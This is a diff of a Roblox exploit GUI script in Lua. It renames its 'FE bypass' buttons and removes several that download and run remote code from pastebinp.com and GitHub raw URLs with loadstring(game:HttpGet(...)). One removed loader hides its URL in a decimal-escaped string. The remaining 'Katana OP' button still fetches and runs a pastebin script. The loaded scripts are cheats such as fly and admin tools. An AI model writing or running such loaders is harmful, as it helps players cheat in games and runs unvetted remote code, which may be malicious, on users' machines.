@@ -2076,20 +2076,8 @@ end,
 })
 
 local Button = AnimationsTab:CreateButton({
-   Name = "FE AnimationsV2",
+   Name = "Op katana Animation",
    Callback = function()
-   s = Instance.new("Sound")
- s.Name = "Music"
- s.SoundId = "http://www.roblox.com/asset/?id=9086208751" --Put the id into there.
- s.Looped = false
- s.Pitch = 1 --You can edit these settings.
- s.Volume = 4 --You can edit these settings.
- s.archivable = false
- 
-  s.Parent = game.Workspace
-
-
-s:play()
 
 game:GetService("StarterGui"):SetCore("SendNotification", { 
         Title = "";
@@ -2126,7 +2114,7 @@ Name.Parent = Frame
 Name.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 Name.Size = UDim2.new(0, 378, 0, 25)
 Name.Font = Enum.Font.GothamBold
-Name.Text = "Fe Bypass"
+Name.Text = "Fe Katana Op"
 Name.TextColor3 = Color3.fromRGB(320, 230, 210)
 Name.TextScaled = true
 Name.TextSize = 14.000
@@ -2138,33 +2126,18 @@ Credits.BackgroundColor3 = Color3.fromRGB(255, 233, 254)
 Credits.Position = UDim2.new(0, 0, 0.912, 0)
 Credits.Size = UDim2.new(0, 378, 0, 22)
 Credits.Font = Enum.Font.GothamBold
-Credits.Text = "By Shoota"
+Credits.Text = "By ShootasWrld"
 Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
 Credits.TextScaled = true
 Credits.TextSize = 14.000
 Credits.TextWrapped = true
-
-e1x1x1x1Message.Name = "e1x1x1x1Message"
-e1x1x1x1Message.Parent = Frame
-e1x1x1x1Message.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-e1x1x1x1Message.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
-e1x1x1x1Message.Size = UDim2.new(0, 79, 0, 31)
-e1x1x1x1Message.Font = Enum.Font.GothamBold
-e1x1x1x1Message.Text = "Dual Rainbow Sword"
-e1x1x1x1Message.TextColor3 = Color3.fromRGB(0, 0, 0)
-e1x1x1x1Message.TextScaled = true
-e1x1x1x1Message.TextSize = 14.000
-e1x1x1x1Message.TextWrapped = true
-e1x1x1x1Message.MouseButton1Down:connect(function()
-loadstring(game:HttpGet(('https://pastebinp.com/raw/4FFyimTY'),true))()
-end)
 e1x1x1x1Music.Name = "e1x1x1x1Music"
 e1x1x1x1Music.Parent = Frame
 e1x1x1x1Music.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 e1x1x1x1Music.Position = UDim2.new(0.0714285746, 0, 0.436000019, 0)
 e1x1x1x1Music.Size = UDim2.new(0, 79, 0, 31)
 e1x1x1x1Music.Font = Enum.Font.GothamBold
-e1x1x1x1Music.Text = "Katana V2"
+e1x1x1x1Music.Text = "Katana OP"
 e1x1x1x1Music.TextColor3 = Color3.fromRGB(0, 0, 0)
 e1x1x1x1Music.TextScaled = true
 e1x1x1x1Music.TextSize = 14.000
@@ -2172,107 +2145,7 @@ e1x1x1x1Music.TextWrapped = true
 e1x1x1x1Music.MouseButton1Down:connect(function()
 loadstring(game:HttpGet(('https://pastebinp.com/raw/TCzGwJG1'),true))()
 end)
-e1x1x1x1Laugh.Name = "e1x1x1x1Laugh"
-e1x1x1x1Laugh.Parent = Frame
-e1x1x1x1Laugh.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-e1x1x1x1Laugh.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
-e1x1x1x1Laugh.Size = UDim2.new(0, 79, 0, 34)
-e1x1x1x1Laugh.Font = Enum.Font.GothamBold
-e1x1x1x1Laugh.Text = "Keyboard"
-e1x1x1x1Laugh.TextColor3 = Color3.fromRGB(0, 0, 0)
-e1x1x1x1Laugh.TextScaled = true
-e1x1x1x1Laugh.TextSize = 14.000
-e1x1x1x1Laugh.TextWrapped = true
-e1x1x1x1Laugh.MouseButton1Down:connect(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
-end)
-DayToNight.Name = "DayToNight"
-DayToNight.Parent = Frame
-DayToNight.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-DayToNight.Position = UDim2.new(0.388888896, 0, 0.216000006, 0)
-DayToNight.Size = UDim2.new(0, 83, 0, 31)
-DayToNight.Font = Enum.Font.GothamBold
-DayToNight.Text = "Thomas"
-DayToNight.TextColor3 = Color3.fromRGB(0, 0, 0)
-DayToNight.TextScaled = true
-DayToNight.TextSize = 14.000
-DayToNight.TextWrapped = true
-DayToNight.MouseButton1Down:connect(function()
-while true do
-loadstring(game:HttpGet(('https://pastebinp.com/raw/rfWbgrRy'),true))()
-	end
-end)
-e666.Name = "e666"
-e666.Parent = Frame
-e666.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-e666.Position = UDim2.new(0.388888896, 0, 0.43599999, 0)
-e666.Size = UDim2.new(0, 83, 0, 31)
-e666.Font = Enum.Font.GothamBold
-e666.Text = "Lua Hammer"
-e666.TextColor3 = Color3.fromRGB(0, 0, 0)
-e666.TextScaled = true
-e666.TextSize = 14.000
-e666.TextWrapped = true
-e666.MouseButton1Down:connect(function()
-loadstring(game:HttpGet(('https://pastebinp.com/raw/exP5CLH6'),true))()
-end)
-EpicSaxGuy.Name = "EpicSaxGuy"
-EpicSaxGuy.Parent = Frame
-EpicSaxGuy.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-EpicSaxGuy.Position = UDim2.new(0.388888896, 0, 0.648000002, 0)
-EpicSaxGuy.Size = UDim2.new(0, 83, 0, 34)
-EpicSaxGuy.Font = Enum.Font.GothamBold
-EpicSaxGuy.Text = "Fly Gui"
-EpicSaxGuy.TextColor3 = Color3.fromRGB(0, 0, 0)
-EpicSaxGuy.TextScaled = true
-EpicSaxGuy.TextSize = 14.000
-EpicSaxGuy.TextWrapped = true
-EpicSaxGuy.MouseButton1Down:connect(function()
-loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
-end)
-Disc0.Name = "Disc0"
-Disc0.Parent = Frame
-Disc0.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Disc0.Position = UDim2.new(0.693121672, 0, 0.216000006, 0)
-Disc0.Size = UDim2.new(0, 89, 0, 31)
-Disc0.Font = Enum.Font.GothamBold
-Disc0.Text = "John Doe"
-Disc0.TextColor3 = Color3.fromRGB(0, 0, 0)
-Disc0.TextScaled = true
-Disc0.TextSize = 14.000
-Disc0.TextWrapped = true
-Disc0.MouseButton1Down:connect(function()
-loadstring(game:HttpGet(('https://pastebinp.com/raw/KseVTanj'),true))()
-end)
-e2006Theme.Name = "e2006Theme"
-e2006Theme.Parent = Frame
-e2006Theme.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-e2006Theme.Position = UDim2.new(0.693121672, 0, 0.43599999, 0)
-e2006Theme.Size = UDim2.new(0, 89, 0, 31)
-e2006Theme.Font = Enum.Font.GothamBold
-e2006Theme.Text = "Grab Knife"
-e2006Theme.TextColor3 = Color3.fromRGB(0, 0, 0)
-e2006Theme.TextScaled = true
-e2006Theme.TextSize = 14.000
-e2006Theme.TextWrapped = true
-e2006Theme.MouseButton1Down:connect(function()
-loadstring(game:HttpGet(('https://pastebinp.com/raw/frHvA27v'),true))()
-end)
-ForceField.Name = "ForceField"
-ForceField.Parent = Frame
-ForceField.BackgroundColor3 = Color3.fromRGB(255, 320, 170)
-ForceField.Position = UDim2.new(0.693121672, 0, 0.648000002, 0)
-ForceField.Size = UDim2.new(0, 89, 0, 34)
-ForceField.Font = Enum.Font.GothamBold
-ForceField.Text = "Tiger Admin"
-ForceField.TextColor3 = Color3.fromRGB(0, 0, 0)
-ForceField.TextScaled = true
-ForceField.TextSize = 14.000
-ForceField.TextWrapped = true
-ForceField.MouseButton1Down:connect(function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/H17S32/Tiger_Admin/main/Script'))()
-
-	-- Gui to Lua
+--Gui to Lua
 	-- Version: 3.
 	-- Instances:
 
@@ -2388,7 +2261,6 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/H17S32/Tiger_Admin/ma
 		script.Parent.MouseButton1Click:connect(onClicked)
 	end
 	coroutine.wrap(FNHQ_fake_script)()
-end)
 -- Scripts:
 
 local function QFCS_fake_script() -- Frame.Dragify 
